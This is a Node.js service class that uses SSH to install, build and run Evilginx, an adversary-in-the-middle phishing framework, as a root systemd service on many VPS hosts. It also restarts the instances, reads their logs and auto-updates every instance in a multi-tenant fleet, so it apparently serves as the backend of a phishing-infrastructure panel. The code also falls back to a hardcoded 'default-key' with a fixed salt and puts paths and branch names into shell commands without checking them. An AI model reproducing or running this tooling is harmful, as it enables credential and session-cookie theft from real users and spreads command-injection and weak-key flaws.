// =====================================================
// SSH Service - Remote VPS Operations
// =====================================================

const { Client } = require('ssh2');
const crypto = require('crypto');

class SSHService {
    constructor(pool) {
        this.pool = pool;
        this.connections = new Map(); // Cache active connections
    }

    // =====================================================
    // ENCRYPTION FOR STORED CREDENTIALS
    // =====================================================

    encryptCredential(text, secretKey) {
        const iv = crypto.randomBytes(16);
        const key = crypto.scryptSync(secretKey || process.env.ENCRYPTION_KEY || 'default-key', 'salt', 32);
        const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag().toString('hex');
        return `${iv.toString('hex')}:${authTag}:${encrypted}`;
    }

    decryptCredential(encryptedText, secretKey) {
        try {
            const parts = encryptedText.split(':');
            if (parts.length !== 3) return null;
            
            const iv = Buffer.from(parts[0], 'hex');
            const authTag = Buffer.from(parts[1], 'hex');
            const encrypted = parts[2];
            
            const key = crypto.scryptSync(secretKey || process.env.ENCRYPTION_KEY || 'default-key', 'salt', 32);
            const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
            decipher.setAuthTag(authTag);
            
            let decrypted = decipher.update(encrypted, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            return decrypted;
        } catch (error) {
            console.error('Decryption error:', error);
            return null;
        }
    }

    // =====================================================
    // SSH CONNECTION
    // =====================================================

    async connect(vps) {
        return new Promise((resolve, reject) => {
            const conn = new Client();
            
            const config = {
                host: vps.host,
                port: vps.port || 22,
                username: vps.username,
                readyTimeout: 30000,
                keepaliveInterval: 10000,
            };

            // Add authentication
            if (vps.auth_type === 'key') {
                config.privateKey = this.decryptCredential(vps.ssh_key_encrypted);
            } else {
                config.password = this.decryptCredential(vps.password_encrypted);
            }

            conn.on('ready', () => {
                console.log(`✅ SSH connected to ${vps.host}`);
                resolve(conn);
            });

            conn.on('error', (err) => {
                console.error(`❌ SSH connection error to ${vps.host}:`, err.message);
                reject(err);
            });

            conn.on('close', () => {
                console.log(`🔌 SSH disconnected from ${vps.host}`);
                this.connections.delete(vps.id);
            });

            conn.connect(config);
        });
    }

    async getConnection(vpsId) {
        // Check cache first
        if (this.connections.has(vpsId)) {
            const cached = this.connections.get(vpsId);
            if (cached.conn && cached.conn._sock && !cached.conn._sock.destroyed) {
                return cached.conn;
            }
        }

        // Get VPS details from database
        const result = await this.pool.query(
            'SELECT * FROM vps_instances WHERE id = $1',
            [vpsId]
        );

        if (result.rows.length === 0) {
            throw new Error('VPS not found');
        }

        const vps = result.rows[0];
        const conn = await this.connect(vps);
        this.connections.set(vpsId, { conn, vps });
        return conn;
    }

    // =====================================================
    // COMMAND EXECUTION
    // =====================================================

    async executeCommand(conn, command, timeout = 60000) {
        return new Promise((resolve, reject) => {
            let stdout = '';
            let stderr = '';
            let timer = null;

            if (timeout > 0) {
                timer = setTimeout(() => {
                    reject(new Error(`Command timed out after ${timeout}ms`));
                }, timeout);
            }

            conn.exec(command, (err, stream) => {
                if (err) {
                    if (timer) clearTimeout(timer);
                    return reject(err);
                }

                stream.on('close', (code, signal) => {
                    if (timer) clearTimeout(timer);
                    resolve({
                        code,
                        signal,
                        stdout: stdout.trim(),
                        stderr: stderr.trim()
                    });
                });

                stream.on('data', (data) => {
                    stdout += data.toString();
                });

                stream.stderr.on('data', (data) => {
                    stderr += data.toString();
                });
            });
        });
    }

    async exec(vpsId, command, timeout = 60000) {
        const conn = await this.getConnection(vpsId);
        return this.executeCommand(conn, command, timeout);
    }

    // =====================================================
    // VPS OPERATIONS
    // =====================================================

    async testConnection(vps) {
        try {
            const conn = await this.connect(vps);
            const result = await this.executeCommand(conn, 'echo "Connection successful" && hostname');
            conn.end();
            return { success: true, hostname: result.stdout.split('\n')[1] };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async getSystemInfo(vpsId) {
        try {
            const conn = await this.getConnection(vpsId);
            
            const commands = {
                os: 'cat /etc/os-release | grep "PRETTY_NAME" | cut -d= -f2 | tr -d \'"\'',
                kernel: 'uname -r',
                cpu_cores: 'nproc',
                memory_total: 'free -m | awk \'/^Mem:/{print $2}\'',
                memory_used: 'free -m | awk \'/^Mem:/{print $3}\'',
                disk_total: 'df -h / | awk \'NR==2{print $2}\'',
                disk_used: 'df -h / | awk \'NR==2{print $3}\'',
                disk_percent: 'df -h / | awk \'NR==2{print $5}\'',
                uptime: 'uptime -s',
                load: 'cat /proc/loadavg | awk \'{print $1, $2, $3}\''
            };

            const info = {};
            for (const [key, cmd] of Object.entries(commands)) {
                try {
                    const result = await this.executeCommand(conn, cmd, 10000);
                    info[key] = result.stdout;
                } catch (e) {
                    info[key] = 'unknown';
                }
            }

            return info;
        } catch (error) {
            throw new Error(`Failed to get system info: ${error.message}`);
        }
    }

    // =====================================================
    // DEPLOYMENT OPERATIONS
    // =====================================================

    async deploy(vpsId, deploymentId, logCallback) {
        const log = async (level, message) => {
            console.log(`[${level.toUpperCase()}] ${message}`);
            if (logCallback) await logCallback(level, message);
            await this.pool.query(
                'INSERT INTO deployment_logs (deployment_id, level, message) VALUES ($1, $2, $3)',
                [deploymentId, level, message]
            );
        };

        try {
            // Get VPS details
            const vpsResult = await this.pool.query(
                'SELECT * FROM vps_instances WHERE id = $1',
                [vpsId]
            );
            const vps = vpsResult.rows[0];

            // Update deployment status
            await this.pool.query(
                'UPDATE deployments SET status = $1, started_at = NOW() WHERE id = $2',
                ['in_progress', deploymentId]
            );
            await this.pool.query(
                'UPDATE vps_instances SET status = $1 WHERE id = $2',
                ['deploying', vpsId]
            );

            await log('info', `Starting deployment to ${vps.host}...`);
            const conn = await this.getConnection(vpsId);

            // Check if Go is installed
            await log('info', 'Checking Go installation...');
            let result = await this.executeCommand(conn, 'which go || echo "not_found"');
            const goInstalled = !result.stdout.includes('not_found');

            if (!goInstalled) {
                await log('info', 'Installing Go...');
                const installGoCommands = `
                    cd /tmp && 
                    wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz && 
                    sudo rm -rf /usr/local/go && 
                    sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz && 
                    echo 'export PATH=$PATH:/usr/local/go/bin' | sudo tee -a /etc/profile && 
                    export PATH=$PATH:/usr/local/go/bin && 
                    go version
                `;
                result = await this.executeCommand(conn, installGoCommands, 300000);
                await log('info', `Go installed: ${result.stdout}`);
            } else {
                await log('info', `Go already installed: ${result.stdout}`);
            }

            // Install git if needed
            await log('info', 'Checking git installation...');
            result = await this.executeCommand(conn, 'which git || sudo apt-get update && sudo apt-get install -y git');

            // Create install directory
            const installPath = vps.install_path || '/opt/evilginx';
            await log('info', `Setting up installation directory: ${installPath}`);
            await this.executeCommand(conn, `sudo mkdir -p ${installPath} && sudo chown $(whoami):$(whoami) ${installPath}`);

            // Clone or pull repository
            const repoUrl = vps.github_repo || 'https://github.com/yourusername/evilginx2.git';
            const branch = vps.github_branch || 'main';
            
            result = await this.executeCommand(conn, `test -d ${installPath}/.git && echo "exists" || echo "not_exists"`);
            
            if (result.stdout.includes('exists')) {
                await log('info', 'Updating existing repository...');
                result = await this.executeCommand(conn, `cd ${installPath} && git fetch origin && git reset --hard origin/${branch}`, 120000);
            } else {
                await log('info', `Cloning repository from ${repoUrl}...`);
                result = await this.executeCommand(conn, `cd ${installPath} && git clone -b ${branch} ${repoUrl} .`, 120000);
            }
            await log('info', result.stdout || 'Repository updated');

            // Get current commit
            result = await this.executeCommand(conn, `cd ${installPath} && git rev-parse --short HEAD`);
            const gitCommit = result.stdout.trim();
            await log('info', `Current commit: ${gitCommit}`);

            // Build the application
            await log('info', 'Building Evilginx...');
            result = await this.executeCommand(conn, `
                export PATH=$PATH:/usr/local/go/bin &&
                cd ${installPath} && 
                go mod download && 
                go build -o evilginx
            `, 600000);
            
            if (result.code !== 0) {
                throw new Error(`Build failed: ${result.stderr}`);
            }
            await log('info', 'Build successful!');

            // Create data directories
            await this.executeCommand(conn, `mkdir -p ${installPath}/data ${installPath}/phishlets ${installPath}/redirectors`);

            // Create systemd service
            await log('info', 'Setting up systemd service...');
            const serviceContent = `
[Unit]
Description=Evilginx Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${installPath}
ExecStart=${installPath}/evilginx -p ${installPath}/phishlets -c ${installPath}/data -developer
Restart=always
RestartSec=5
StandardOutput=append:${installPath}/evilginx.log
StandardError=append:${installPath}/evilginx-error.log

[Install]
WantedBy=multi-user.target
`;
            await this.executeCommand(conn, `echo '${serviceContent}' | sudo tee /etc/systemd/system/evilginx.service`);
            await this.executeCommand(conn, 'sudo systemctl daemon-reload');
            await this.executeCommand(conn, 'sudo systemctl enable evilginx');
            await log('info', 'Systemd service configured');

            // Start the service
            await log('info', 'Starting Evilginx service...');
            await this.executeCommand(conn, 'sudo systemctl restart evilginx');
            
            // Wait a moment and check status
            await new Promise(resolve => setTimeout(resolve, 3000));
            result = await this.executeCommand(conn, 'sudo systemctl is-active evilginx');
            const isRunning = result.stdout.trim() === 'active';

            if (isRunning) {
                await log('info', '✅ Evilginx is running!');
            } else {
                await log('warn', 'Service may not be running properly. Checking logs...');
                result = await this.executeCommand(conn, `tail -20 ${installPath}/evilginx-error.log 2>/dev/null || echo "No error log"`);
                await log('warn', result.stdout);
            }

            // Update database
            await this.pool.query(`
                UPDATE vps_instances SET 
                    status = $1, 
                    is_deployed = TRUE, 
                    deployed_version = $2,
                    deployed_at = NOW()
                WHERE id = $3
            `, [isRunning ? 'running' : 'error', gitCommit, vpsId]);

            await this.pool.query(`
                UPDATE deployments SET 
                    status = $1, 
                    finished_at = NOW(),
                    to_version = $2,
                    git_commit = $3,
                    duration_seconds = EXTRACT(EPOCH FROM (NOW() - started_at))::INTEGER
                WHERE id = $4
            `, ['success', gitCommit, gitCommit, deploymentId]);

            await log('info', '🎉 Deployment completed successfully!');
            return { success: true, version: gitCommit };

        } catch (error) {
            await log('error', `Deployment failed: ${error.message}`);
            
            await this.pool.query(
                'UPDATE deployments SET status = $1, finished_at = NOW(), error_message = $2 WHERE id = $3',
                ['failed', error.message, deploymentId]
            );
            await this.pool.query(
                'UPDATE vps_instances SET status = $1, last_error = $2 WHERE id = $3',
                ['error', error.message, vpsId]
            );

            throw error;
        }
    }

    async startService(vpsId) {
        const conn = await this.getConnection(vpsId);
        const result = await this.executeCommand(conn, 'sudo systemctl start evilginx');
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        const status = await this.executeCommand(conn, 'sudo systemctl is-active evilginx');
        const isRunning = status.stdout.trim() === 'active';
        
        await this.pool.query(
            'UPDATE vps_instances SET status = $1 WHERE id = $2',
            [isRunning ? 'running' : 'error', vpsId]
        );
        
        return { success: isRunning, status: status.stdout.trim() };
    }

    async stopService(vpsId) {
        const conn = await this.getConnection(vpsId);
        await this.executeCommand(conn, 'sudo systemctl stop evilginx');
        
        await this.pool.query(
            'UPDATE vps_instances SET status = $1 WHERE id = $2',
            ['stopped', vpsId]
        );
        
        return { success: true };
    }

    async restartService(vpsId) {
        const conn = await this.getConnection(vpsId);
        await this.executeCommand(conn, 'sudo systemctl restart evilginx');
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        const status = await this.executeCommand(conn, 'sudo systemctl is-active evilginx');
        const isRunning = status.stdout.trim() === 'active';
        
        await this.pool.query(
            'UPDATE vps_instances SET status = $1 WHERE id = $2',
            [isRunning ? 'running' : 'error', vpsId]
        );
        
        return { success: isRunning, status: status.stdout.trim() };
    }

    async getServiceStatus(vpsId) {
        try {
            const conn = await this.getConnection(vpsId);
            
            const [statusResult, uptimeResult, pidResult] = await Promise.all([
                this.executeCommand(conn, 'sudo systemctl is-active evilginx'),
                this.executeCommand(conn, 'sudo systemctl show evilginx --property=ActiveEnterTimestamp | cut -d= -f2'),
                this.executeCommand(conn, 'pgrep -f "evilginx" | head -1')
            ]);

            const isActive = statusResult.stdout.trim() === 'active';
            
            // Calculate uptime
            let uptimeSeconds = 0;
            if (isActive && uptimeResult.stdout) {
                const startTime = new Date(uptimeResult.stdout.trim());
                uptimeSeconds = Math.floor((Date.now() - startTime.getTime()) / 1000);
            }

            // Update heartbeat
            await this.pool.query(
                'UPDATE vps_instances SET status = $1, last_heartbeat = NOW(), pid = $2, uptime_seconds = $3 WHERE id = $4',
                [isActive ? 'running' : 'stopped', pidResult.stdout.trim() || null, uptimeSeconds, vpsId]
            );

            return {
                running: isActive,
                status: statusResult.stdout.trim(),
                pid: pidResult.stdout.trim(),
                uptime_seconds: uptimeSeconds
            };
        } catch (error) {
            await this.pool.query(
                'UPDATE vps_instances SET status = $1, last_error = $2 WHERE id = $3',
                ['offline', error.message, vpsId]
            );
            return { running: false, status: 'offline', error: error.message };
        }
    }

    async getLogs(vpsId, lines = 100) {
        const conn = await this.getConnection(vpsId);
        
        const vpsResult = await this.pool.query(
            'SELECT install_path FROM vps_instances WHERE id = $1',
            [vpsId]
        );
        const installPath = vpsResult.rows[0]?.install_path || '/opt/evilginx';

        const result = await this.executeCommand(conn, `
            echo "=== APPLICATION LOGS ===" &&
            tail -${lines} ${installPath}/evilginx.log 2>/dev/null || echo "No application log" &&
            echo "" &&
            echo "=== ERROR LOGS ===" &&
            tail -${lines} ${installPath}/evilginx-error.log 2>/dev/null || echo "No error log"
        `);

        return result.stdout;
    }

    // =====================================================
    // UPDATE OPERATIONS
    // =====================================================

    async update(vpsId, deploymentId) {
        // This is essentially a re-deploy with git pull
        return this.deploy(vpsId, deploymentId);
    }

    async updateAllVPS() {
        // Get all deployed VPS instances
        const result = await this.pool.query(
            'SELECT id FROM vps_instances WHERE is_deployed = TRUE'
        );

        const updates = [];
        for (const vps of result.rows) {
            try {
                // Create deployment record
                const deployResult = await this.pool.query(`
                    INSERT INTO deployments (vps_id, user_id, type, triggered_by)
                    SELECT id, user_id, 'update', 'webhook'
                    FROM vps_instances WHERE id = $1
                    RETURNING id
                `, [vps.id]);

                const deploymentId = deployResult.rows[0].id;
                
                // Start deployment (non-blocking)
                this.deploy(vps.id, deploymentId).catch(err => {
                    console.error(`Auto-update failed for VPS ${vps.id}:`, err);
                });

                updates.push({ vps_id: vps.id, deployment_id: deploymentId });
            } catch (error) {
                console.error(`Failed to initiate update for VPS ${vps.id}:`, error);
            }
        }

        return updates;
    }

    // =====================================================
    // CLEANUP
    // =====================================================

    disconnect(vpsId) {
        if (this.connections.has(vpsId)) {
            const { conn } = this.connections.get(vpsId);
            if (conn) conn.end();
            this.connections.delete(vpsId);
        }
    }

    disconnectAll() {
        for (const [id, { conn }] of this.connections) {
            if (conn) conn.end();
        }
        this.connections.clear();
    }
}

module.exports = SSHService;

